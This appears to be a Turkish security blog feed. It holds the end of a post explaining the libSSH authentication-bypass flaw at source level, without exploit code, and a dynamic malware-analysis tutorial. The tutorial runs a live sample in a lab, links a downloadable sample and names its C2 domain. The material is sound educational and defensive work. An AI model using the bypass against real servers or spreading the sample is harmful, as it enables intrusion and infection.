&lt;p&gt;Daha derine inmeden önce size basit bir şekilde bir &lt;strong&gt;Exploit&lt;/strong&gt;‘in ne olduğundan ve nasıl geliştirilebileceğinden bahsetmek istiyorum.&lt;/p&gt;

&lt;h4 id=&quot;exploit-nedir-&quot;&gt;Exploit nedir ?&lt;/h4&gt;

&lt;p&gt;Bir &lt;strong&gt;Exploit&lt;/strong&gt; genellikle &lt;strong&gt;Zafiyet&lt;/strong&gt; içeren bir kodu sömürmek için geliştirilen bir kod parçasıdır.&lt;/p&gt;

&lt;h4 id=&quot;exploit-development-nedir-&quot;&gt;Exploit Development Nedir ?&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Zafiyet&lt;/strong&gt; içerilen kodu &lt;strong&gt;Analiz&lt;/strong&gt; ettikten sonra bu kodu sömürge için kullanılacak kodu geliştirmektir.&lt;/p&gt;

&lt;p&gt;Daha da açarsam konuyu &lt;strong&gt;Exploit&lt;/strong&gt; geliştirmek için bu sömürge kod parçasını yazacağınız &lt;strong&gt;Zafiyeti&lt;/strong&gt; ve bu &lt;strong&gt;Zafiyet&lt;/strong&gt;‘in &lt;strong&gt;Kod&lt;/strong&gt;‘unu kavramanız gerekmektedir.&lt;/p&gt;

&lt;h4 id=&quot;ben-libssh-exploitini-nasıl-geliştirdim&quot;&gt;Ben libSSH Exploit’ini nasıl geliştirdim&lt;/h4&gt;

&lt;p&gt;Dediğim gibi &lt;strong&gt;CVE&lt;/strong&gt; listelerinde gezerken denk geldim ve &lt;strong&gt;libSSH&lt;/strong&gt; bir kütüphane olduğundan &lt;strong&gt;Authentication&lt;/strong&gt; yapılan kısımları incelemeye başladım bu kütüphane içerisinde.&lt;/p&gt;

&lt;p&gt;Yani gerçekleştirilecek oturum yani &lt;strong&gt;Session&lt;/strong&gt; için kütüphane içerisinde var olan &lt;strong&gt;Giriş&lt;/strong&gt;, &lt;strong&gt;Çıkış&lt;/strong&gt; ve &lt;strong&gt;Kontrol&lt;/strong&gt; kodlarını incelemeye başladım.&lt;/p&gt;

&lt;p&gt;Ve bu kodlar içerisinde baştada resmini verdiğim &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘una denk geldim.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;libSSH&lt;/strong&gt; içerisinde bulunan şu küçük &lt;strong&gt;Kod Parça&lt;/strong&gt;‘sı benim gerekli olan &lt;strong&gt;Exploit&lt;/strong&gt;‘i geliştirmemi sağladı diyebilirim :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SSH_PACKET_CALLBACK(ssh_packet_userauth_success)
  (void)packet;
  (void)type;
  (void)user;

  SSH_LOG(SSH_LOG_DEBUG, &quot;Authentication successful&quot;);
  SSH_LOG(SSH_LOG_TRACE, &quot;Received SSH_USERAUTH_SUCCESS&quot;);

  session-&amp;gt;auth.state = SSH_AUTH_STATE_SUCCESS;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Burada gördüğünüz &lt;strong&gt;Kaynak Kod&lt;/strong&gt; basit bir şekilde eğer dışarıdan &lt;strong&gt;libSSH&lt;/strong&gt; çalıştırılan sunucu içerisinde &lt;strong&gt;SSH_AUTH_STATE_SUCCESS&lt;/strong&gt; byte’ı eklenirse aşşağıdaki kodu çalıştır diyor :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;session-&amp;gt; auth.state = SSH_AUTH_STATE_SUCCESS;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ve bu &lt;strong&gt;Kod&lt;/strong&gt; ise basit bir şekilde &lt;strong&gt;session&lt;/strong&gt; içerisinde bulunan &lt;strong&gt;auth&lt;/strong&gt; objesindeki &lt;strong&gt;state&lt;/strong&gt; değişkenine &lt;strong&gt;SSH_AUTH_STATE_SUCCESS&lt;/strong&gt; byte’ını ekliyor.&lt;/p&gt;

&lt;p&gt;Buda demek ki sunucuya gönderdiğimiz &lt;strong&gt;SSH_AUTH_STATE_SUCCESS&lt;/strong&gt; byte’ı bizi sunucu’ya &lt;strong&gt;Kullanıcı Adı&lt;/strong&gt; ve &lt;strong&gt;Şifre&lt;/strong&gt; vermeden sokabilecek.&lt;/p&gt;

&lt;p&gt;Bende &lt;strong&gt;CVE&lt;/strong&gt;‘de ki açıklamayı okuduktan sonra &lt;strong&gt;libSSH&lt;/strong&gt; içerisindeki &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘ları inceledikten sonra &lt;strong&gt;Exploit&lt;/strong&gt;‘i geliştirmek için &lt;strong&gt;Zafiyet&lt;/strong&gt;‘i bu şekilde kavradım.&lt;/p&gt;

&lt;p&gt;Ve sömürge kodunu geliştirdim.&lt;/p&gt;

&lt;p&gt;Şimdi daha da derine inip sizlerin nasıl &lt;strong&gt;Exploit&lt;/strong&gt; geliştirebileceğinden bahsedeyim.&lt;/p&gt;
&lt;h1 id=&quot;exploit-development-1&quot;&gt;Exploit Development&lt;/h1&gt;

&lt;p&gt;Öncelikle &lt;strong&gt;Kaynak Kod&lt;/strong&gt; okumaya aşina olmanız gerek.&lt;/p&gt;

&lt;p&gt;Çok çok önceden var olan bir söz vardır.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Bir hacker programcıdan daha iyi programlaya bildiği ve bunu tersine kullana bildiği için hackerdir.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Yani basit bir şekilde sizlerin &lt;strong&gt;Sömürge Kod&lt;/strong&gt;‘unu geliştirmeniz için &lt;strong&gt;Kaynak Kod&lt;/strong&gt;‘u okumaya aşina olmanız gerek.&lt;/p&gt;

&lt;p&gt;Kendi &lt;strong&gt;Exploit&lt;/strong&gt;‘lerinizi geliştirmek için &lt;strong&gt;Zafiyet&lt;/strong&gt;‘i illaki sizin bulmanız gerekmez.&lt;/p&gt;

&lt;p&gt;Yalnız bir hedef’e &lt;strong&gt;Saldırmadan&lt;/strong&gt; önce o hedefi &lt;strong&gt;Tanımanız&lt;/strong&gt; gereklidir.&lt;/p&gt;

&lt;p&gt;Bir çok&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;FTP&lt;/li&gt;
  &lt;li&gt;SMTP&lt;/li&gt;
  &lt;li&gt;SSH&lt;/li&gt;
  &lt;li&gt;HTTP&lt;/li&gt;
  &lt;li&gt;vs…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Exploit&lt;/strong&gt; kodu görebiliyorum internet’te yalnız bu &lt;strong&gt;Exploit&lt;/strong&gt; geliştirenlerin 0’dan bir &lt;strong&gt;FTP&lt;/strong&gt; ya da &lt;strong&gt;SMTP&lt;/strong&gt; vs… &lt;strong&gt;Server&lt;/strong&gt;‘i ya da &lt;strong&gt;Client&lt;/strong&gt;‘i geliştirebileni &lt;strong&gt;%5&lt;/strong&gt;‘lik hisse.&lt;/p&gt;

&lt;p&gt;Dolayısı ile &lt;strong&gt;Zafiyet&lt;/strong&gt;‘i tanımak ve buna gerekli &lt;strong&gt;Exploit&lt;/strong&gt;‘i geliştirebilmeniz için &lt;strong&gt;Teknoloji&lt;/strong&gt;‘yi kendiniz yazmış gibi tanımanız gerekmekte.&lt;/p&gt;

&lt;h1 id=&quot;the-end&quot;&gt;THE END&lt;/h1&gt;
&lt;p&gt;Bu yazımızında sonuna geldik.&lt;/p&gt;

&lt;p&gt;Bir &lt;strong&gt;CVE&lt;/strong&gt;‘nin ne olduğundan ve bunun &lt;strong&gt;Analizi&lt;/strong&gt;‘nin nasıl yapılacağından aynı zamanda &lt;strong&gt;Zafiyet&lt;/strong&gt;‘ler için nasıl &lt;strong&gt;Sömürge Kodu&lt;/strong&gt; yani &lt;strong&gt;Exploit&lt;/strong&gt; geliştirilebileceğinden bahsettim.&lt;/p&gt;

&lt;p&gt;Sorularınız mevcut ise : &lt;a href=&quot;https://twitter.com/0DAYanc&quot;&gt;Twitter&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">CVE Analizi ve Exploit Development</summary></entry><entry><title type="html">Malware Analysis - Dynamic Analysis (Part 3)</title><link href="http://localhost:4000/2019/05/20/malware-analysis-part-3.html" rel="alternate" type="text/html" title="Malware Analysis - Dynamic Analysis (Part 3)" /><published>2019-05-20T00:00:00+03:00</published><updated>2019-05-20T00:00:00+03:00</updated><id>http://localhost:4000/2019/05/20/malware-analysis-part-3</id><content type="html" xml:base="http://localhost:4000/2019/05/20/malware-analysis-part-3.html">&lt;h1 id=&quot;malware-analysis---dynamic-analysis-part-3&quot;&gt;Malware Analysis - Dynamic Analysis (Part 3)&lt;/h1&gt;
&lt;p&gt;Merhaba arkadaşlar &lt;strong&gt;Malware Analizi&lt;/strong&gt; serimin üçüncü part’ına hoşgeldiniz.&lt;/p&gt;

&lt;p&gt;Bu partımızda artık canlı bir &lt;strong&gt;Malware&lt;/strong&gt; üzerinde işlemler gerçekleştireceğiz.&lt;/p&gt;

&lt;p&gt;İlk part’ımızda anlattığım gibi &lt;strong&gt;Statik&lt;/strong&gt; denildiğinde çalıştırmadan &lt;strong&gt;Dinamik&lt;/strong&gt; denildiğinde ise çalıştırdıktan sonra analizini gerçekleştiriyoruz.&lt;/p&gt;

&lt;p&gt;Bu yazım içerisinde artık &lt;strong&gt;Sanal Makine&lt;/strong&gt; içerisinde testler gerçekleştireceğiz o yüzden &lt;strong&gt;Win 7&lt;/strong&gt; ve &lt;strong&gt;REMnux&lt;/strong&gt; işletim sistemlerini kurduğunuzu varsayıyorum.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Win 7&lt;/strong&gt; içerisinden bir görsel :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/mvpoDx.png?nocache&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;REMnux&lt;/strong&gt; içerisinden bir görsel :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/VWc9OJ.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yazımıza başlamadan önce ilk part’ımızı okuduğunuzu ve &lt;strong&gt;Güvenli&lt;/strong&gt; bir ortam kurduğunuzu varsayıyorum.&lt;/p&gt;

&lt;p&gt;Eğer kurmadıysanız sizi ilk part’ımıza alalım : &lt;a href=&quot;https://blacknbunny.github.io/2019/05/16/malware-analysis-part-1.html&quot;&gt;Malware Analysis - Lab Setup (Part 1)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt;‘nin dışa yayılmayacağından eminsek yavaştan yazımıza geçebiliriz demektir.&lt;/p&gt;

&lt;h2 id=&quot;dinamik-analizin-bize-sağladıkları&quot;&gt;Dinamik Analizin Bize Sağladıkları&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Statik&lt;/strong&gt; analizden farklı olarak &lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştıracağımızdan &lt;strong&gt;Malware&lt;/strong&gt;‘nin sistem içerisinde neler gerçekleştirdiğini daha iyi inceleyebileceğiz sonuçları &lt;strong&gt;Monitoring&lt;/strong&gt; ederek yani izleyerek.&lt;/p&gt;

&lt;p&gt;Öncelikle &lt;strong&gt;Malware&lt;/strong&gt;‘mizi nasıl izleyebileceğimizden bahsetmeden önce &lt;strong&gt;Escape&lt;/strong&gt; kelimesinden okurlarıma bahsetmek istiyorum.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Virtual Machine Escape&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;Sanal Makine&lt;/strong&gt;‘mizde çalıştıracağımız &lt;strong&gt;Malware&lt;/strong&gt;‘yi asıl bilgisayarımızdan ve bu bilgisayarımızın &lt;strong&gt;Network&lt;/strong&gt;‘ünden izole ettik yalnız hala &lt;strong&gt;%100&lt;/strong&gt; güvende değiliz.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Sebebide bazı &lt;strong&gt;Malware&lt;/strong&gt; geliştiricilerinin biraz akıllı davranması.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bir &lt;strong&gt;Malware&lt;/strong&gt; çalıştığı yerin &lt;strong&gt;Sanal Makine&lt;/strong&gt; veya &lt;strong&gt;Gerçek Bir Sistem&lt;/strong&gt; olduğunu anlayabilir. Ve anlamakla kalmayıp aynı zamanda eğer kendisi &lt;strong&gt;Sanal Makine&lt;/strong&gt; içerisindeyse asıl makinemize geçmek için bazı &lt;strong&gt;Zafiyet&lt;/strong&gt;‘leri veya &lt;strong&gt;Teknik&lt;/strong&gt;‘leri kullanabilir.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bunu önlemek içinde &lt;strong&gt;Statik Analiz&lt;/strong&gt; ile çalıştırmadan önce incelememiz çok önemli. Avcıyken avlanmak istemeyiz.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Bu yazı içerisinde benim internetten bulduğum &lt;strong&gt;Malware&lt;/strong&gt; bu gibi işlemlere kalkışmıyor. Dolayısıyla böyle bir duruma maruz kalmayacağız.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;VM Escape&lt;/strong&gt;‘in daha da derinlerine girecek olursak şayet :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/o7IRf4.png?nocache&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Katmanlar arasında geçiş sağlayan &lt;strong&gt;Saldırılar&lt;/strong&gt; denilebilir bunlara.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hypervisor&lt;/strong&gt;‘dan &lt;strong&gt;Operating System&lt;/strong&gt;‘imize giden yolu açan &lt;strong&gt;Saldırı&lt;/strong&gt;‘lara &lt;strong&gt;Virtual Machine Escape&lt;/strong&gt; adı verilebilir.&lt;/p&gt;

&lt;p&gt;İlerideki safhalarda yukarıda bahsettiğim &lt;strong&gt;Malware&lt;/strong&gt;‘nin linkini sizlere vereceğim benimle beraber adım adım ilerlemeniz için.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Dinamik Analiz&lt;/strong&gt;‘in bize sunduklarına gelirsek şayet.&lt;/p&gt;

&lt;p&gt;Canlı olarak &lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştıracağımızdan :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Process&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Registry&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;File System&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Network&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Debugging&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Yukarıda saydıklarımın ne gibi &lt;strong&gt;Aktivite&lt;/strong&gt;‘lerde bulunacağını izleyebileceğiz.&lt;/p&gt;

&lt;p&gt;Terimlere dahada derinden bakıp yavaştan &lt;strong&gt;Malware&lt;/strong&gt;‘mizi &lt;strong&gt;Monitor&lt;/strong&gt; etmeye başlamadan önce &lt;strong&gt;Malware&lt;/strong&gt;‘nin linkini vereyim : &lt;a href=&quot;https://app.any.run/tasks/a5eeea09-1e5d-4538-98a2-b1f23c6baaf6/&quot;&gt;Malware Sample app.any.run&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Buradaki &lt;strong&gt;Sample&lt;/strong&gt; butonundan &lt;strong&gt;Malware&lt;/strong&gt;‘yi indirebilirsiniz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Rar&lt;/strong&gt;‘ın şifresi &lt;strong&gt;infected&lt;/strong&gt;.&lt;/p&gt;

&lt;h4 id=&quot;process-monitoring&quot;&gt;Process Monitoring&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt;‘miz &lt;strong&gt;Process&lt;/strong&gt; olarak çalışmaya başladıktan sonra bu &lt;strong&gt;Process&lt;/strong&gt;‘in ne gibi &lt;strong&gt;Aktivite&lt;/strong&gt;‘lerde bulunduğunu incelemek diyebiliriz buna kısaca.&lt;/p&gt;

&lt;p&gt;Bunu yapmak içinde benim sıkça kullandığım &lt;strong&gt;Tool&lt;/strong&gt;‘u indirmek için : &lt;a href=&quot;https://docs.microsoft.com/en-us/sysinternals/downloads/procmon&quot;&gt;Sysinternals Procmon&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ayrıca bu &lt;strong&gt;Tool&lt;/strong&gt; yukarıda isimlerini saydığımız &lt;strong&gt;Registry&lt;/strong&gt;, &lt;strong&gt;File System&lt;/strong&gt;, &lt;strong&gt;Network&lt;/strong&gt; aktivitelerinide izlememizi sağlıyor.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Win 7&lt;/strong&gt;‘ye kurup açtıktan sonra &lt;strong&gt;Malware&lt;/strong&gt;‘mizin &lt;strong&gt;Process&lt;/strong&gt;‘inin &lt;strong&gt;Monitor&lt;/strong&gt; edilmesinden sonraki çıktı :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/5t7yc5.png?nocache&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu kısımda görebiliriz ki &lt;strong&gt;Malware&lt;/strong&gt;‘miz &lt;strong&gt;Registry&lt;/strong&gt; içerisinde bazı işlemler yapıyor. Aynı zamanda &lt;strong&gt;Operation&lt;/strong&gt; kısmına dikkat edersek &lt;strong&gt;LoadImage&lt;/strong&gt;, &lt;strong&gt;CreateFile&lt;/strong&gt; gibi işlemlerinde &lt;strong&gt;Process&lt;/strong&gt;‘imiz içerisinde geçtiğini görebiliriz.&lt;/p&gt;

&lt;p&gt;Ayrıca &lt;strong&gt;PID&lt;/strong&gt; kısmına dikkat edersek &lt;strong&gt;Ana Process&lt;/strong&gt;‘in altında ayrı bir &lt;strong&gt;malware_sample.exe&lt;/strong&gt; adında &lt;strong&gt;Process&lt;/strong&gt; daha oluşturulmuş. Bunu farklı &lt;strong&gt;PID&lt;/strong&gt;‘ler ile anladım ben yalnız bunu &lt;strong&gt;Procmon&lt;/strong&gt; içerisinde &lt;strong&gt;Process&lt;/strong&gt;‘in &lt;strong&gt;Properties&lt;/strong&gt;‘inden &lt;strong&gt;Stack&lt;/strong&gt; kısmına bakarakda anlayabilirsiniz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/BIzJrm.png?nocache&quot; alt=&quot;Process Özellikleri&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Yukarıdaki şekilde &lt;strong&gt;Process&lt;/strong&gt;‘in &lt;strong&gt;Özellik&lt;/strong&gt;‘lerine girdiğimizde &lt;strong&gt;Stack&lt;/strong&gt; kısmına tıklıyoruz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/4J7p9q.png?nocache&quot; alt=&quot;DLL &amp;amp; Function kullanımı&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ve burada basit bir şekilde gözlemleyebiliyoruz &lt;strong&gt;Process&lt;/strong&gt;‘in gerçekleştirdiği &lt;strong&gt;Operasyon&lt;/strong&gt;‘un hangi &lt;strong&gt;DLL&lt;/strong&gt;‘ler ve &lt;strong&gt;Fonksiyon&lt;/strong&gt;‘lar tarafından uygulandığını.&lt;/p&gt;

&lt;p&gt;Basit bir şekilde &lt;strong&gt;Malware&lt;/strong&gt;‘mizin alt bir &lt;strong&gt;Process&lt;/strong&gt; oluşturduğunu görebiliriz.&lt;/p&gt;

&lt;p&gt;Bu arada şunuda söylemeliyim ki bu &lt;strong&gt;Malware&lt;/strong&gt;‘yi ilk kez izliyorum blog’u yazarken inceleyip yazıyorum.&lt;/p&gt;

&lt;h4 id=&quot;registry-monitoring&quot;&gt;Registry Monitoring&lt;/h4&gt;

&lt;p&gt;Bir &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;Dinamik Analizi&lt;/strong&gt;‘ni gerçekleştiriyorsak şayet bakmamız gereken önemli noktalardan biri &lt;strong&gt;Registry&lt;/strong&gt; değişiklikleridir.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/dGDgaW.png?nocache&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;Malware&lt;/strong&gt; içerisinde herhangi bir şekilde &lt;strong&gt;Registry&lt;/strong&gt; değişikliği yok. Sadece &lt;strong&gt;Registry&lt;/strong&gt; değeri okuma mevcut.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HKLM\System\CurrentControlSet\Session Manager&lt;/li&gt;
  &lt;li&gt;HKLM\System\CurrentControlSet\Control\Safeboot&lt;/li&gt;
  &lt;li&gt;vs…&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Gibi &lt;strong&gt;Registry Value&lt;/strong&gt;‘lerini okuyor. Yalnız hiçbir değişiklik yok.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Registry&lt;/strong&gt; değişiklikleri &lt;strong&gt;Dinamik Malware Analizi&lt;/strong&gt;‘nde çok önemlidir. Bu &lt;strong&gt;Malware Sample&lt;/strong&gt;‘mizde herhangi bir değişiklik bulamasakta bakılması ve incelenmesi gereken yerlerden biridir.&lt;/p&gt;

&lt;h4 id=&quot;file-system-monitoring&quot;&gt;File System Monitoring&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;File System Monitoring&lt;/strong&gt;‘i gerçekleştirmek için &lt;strong&gt;Procmon&lt;/strong&gt; içerisindeki butonlardan &lt;strong&gt;FS Activity&lt;/strong&gt; kısmını seçmemiz yeterli :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/H00Rsw.png?nocache&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Malware&lt;/strong&gt;‘mizin burada gerçekleştirdiği bir çok dosya &lt;strong&gt;okuma&lt;/strong&gt;, &lt;strong&gt;oluşturma&lt;/strong&gt;, &lt;strong&gt;yeniden yazma&lt;/strong&gt; gerçekleştirdiğini görebiliriz.&lt;/p&gt;

&lt;p&gt;Bunların arasından benim ilgimi en çok çeken &lt;strong&gt;System32&lt;/strong&gt; içerisinde :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;WSOCK32.dll&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;netapi32.dll&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;netutils.dll&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Kütüphane&lt;/strong&gt;‘lerini oluşturması.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;DLL&lt;/strong&gt;‘lerden &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;İnternet&lt;/strong&gt; üzerinden birşeyler döndürdüğünü anlamak basit.&lt;/p&gt;

&lt;h4 id=&quot;network-monitoring&quot;&gt;Network Monitoring&lt;/h4&gt;

&lt;p&gt;Bakalım &lt;strong&gt;Malware&lt;/strong&gt;‘miz internet üzerinden neler çeviriyor.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;REMnux&lt;/strong&gt;‘u açıp &lt;strong&gt;fakedns&lt;/strong&gt; ve &lt;strong&gt;inetsim&lt;/strong&gt; komutlarını çalıştıralım.&lt;/p&gt;

&lt;p&gt;Bu sayede sahte &lt;strong&gt;DNS&lt;/strong&gt;, &lt;strong&gt;HTTP&lt;/strong&gt;, &lt;strong&gt;FTP&lt;/strong&gt; vs.. gibi sunucumuz çalışacak ve &lt;strong&gt;Win 7&lt;/strong&gt; içerisinden &lt;strong&gt;Malware&lt;/strong&gt;‘nin gerçekleştirdiği tüm &lt;strong&gt;Network Istek&lt;/strong&gt;‘leri bizim &lt;strong&gt;REMnux&lt;/strong&gt;‘umuza yönlendirilecek.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;fakedns&lt;/strong&gt;
&lt;img src=&quot;https://resmim.net/f/jPs7ZM.png?nocache&quot; alt=&quot;fakedns&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Inetsim&lt;/strong&gt;
&lt;img src=&quot;https://resmim.net/f/Pu2ze0.png?nocache&quot; alt=&quot;inetsim&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Şimdi &lt;strong&gt;Malware&lt;/strong&gt;‘mizi tekrar çalıştırıp yapacağı &lt;strong&gt;Request&lt;/strong&gt;‘leri izlemeye koyulabiliriz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/cfYd2N.png?nocache&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sahte &lt;strong&gt;DNS&lt;/strong&gt; sunucumuza gelen istekleri incelediğimiz zaman görebiliriz ki :&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tain0077.warzonedns.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt; sunucusuna &lt;strong&gt;Malware&lt;/strong&gt;‘miz tekrar tekrar istek gönderiyor.&lt;/p&gt;

&lt;p&gt;Bunun dışındaki istekler &lt;strong&gt;Windows&lt;/strong&gt; ile alakalı tek önemli &lt;strong&gt;DNS Request&lt;/strong&gt;‘i şuan bu bizim için.&lt;/p&gt;

&lt;p&gt;İnternet’ten bu &lt;strong&gt;DNS&lt;/strong&gt; sunucusuna ulaşmak istediğimde bu yerin kapandığını gördüm.&lt;/p&gt;

&lt;p&gt;Muhtemelen &lt;strong&gt;Malware&lt;/strong&gt;‘mizin &lt;strong&gt;C&amp;amp;C&lt;/strong&gt; yani &lt;strong&gt;Command and Control Server&lt;/strong&gt;‘iydi.&lt;/p&gt;

&lt;p&gt;Bu &lt;strong&gt;C&amp;amp;C&lt;/strong&gt; server’i ne kadar kapanmış olsada &lt;strong&gt;DNS&lt;/strong&gt; üzerinden ne gibi bir bağlantı kurup neleri yönlendirdiğini görmek için yavaştan bu &lt;strong&gt;Malware&lt;/strong&gt;‘yi &lt;strong&gt;Debug&lt;/strong&gt; etmeye başlayalım.&lt;/p&gt;

&lt;h4 id=&quot;debugging&quot;&gt;Debugging&lt;/h4&gt;

&lt;p&gt;Bir önceki &lt;strong&gt;Statik Analiz&lt;/strong&gt; part’ımızda &lt;strong&gt;Packing&lt;/strong&gt;‘den bahsettik.&lt;/p&gt;

&lt;p&gt;Yalnız şuan üzerinde durduğumuz &lt;strong&gt;Malware&lt;/strong&gt;  üzerinde hiçbir işlem yapmadık.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hex Editor&lt;/strong&gt; ile &lt;strong&gt;Malware&lt;/strong&gt;‘mizi açtığımda bu &lt;strong&gt;Malware&lt;/strong&gt;‘nin &lt;strong&gt;UPX Packer&lt;/strong&gt; ile &lt;strong&gt;Sıkıştırıldığını gördüm.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/IYLRGV.png?nocache&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Daha net bir &lt;strong&gt;Debugging&lt;/strong&gt; işlemi için bu sıkıştırılmış &lt;strong&gt;Malware&lt;/strong&gt;‘yi asıl haline çevirmemiz gerekiyor.&lt;/p&gt;

&lt;p&gt;Bunu elimizle halletmemiz gerek.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Statik Analiz (Part 2)&lt;/strong&gt; yazım içerisinde &lt;strong&gt;Sıkıştırılmış Zararlı Yazılım&lt;/strong&gt;‘ları tekrar eski haline manuel olarak nasıl getirebileceğimizi az çok anlattım.&lt;/p&gt;

&lt;p&gt;Bu yüzden canlı olarak nasıl yapıldığını anlatan bir video bırakıyorum buraya :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=42bgdnCvQMI&quot;&gt;UPX Easily Unpacked All Versions&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Yada ben bunlarla uğraşmam üşeniyorum diyorsanız. Direk &lt;strong&gt;Malware&lt;/strong&gt;‘yi çalıştırıp sonra debuggeriniz ile &lt;strong&gt;Attach&lt;/strong&gt; olunuz.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Packer&lt;/strong&gt; hafıza içerisinde &lt;strong&gt;Sıkıştırmayı&lt;/strong&gt; eski haline getireceğinden &lt;strong&gt;Malware&lt;/strong&gt;‘nin tüm koduna direkt olarak ulaşabileceksiniz.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://resmim.net/f/4gOVxG.png?nocache&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ve &lt;strong&gt;Malware&lt;/strong&gt;‘mizin gidişatını inceleyerek yani &lt;strong&gt;Monitor&lt;/strong&gt; ederek internet üzerinde yaptığı işlemleri kesinleştirmiş olduk.&lt;/p&gt;

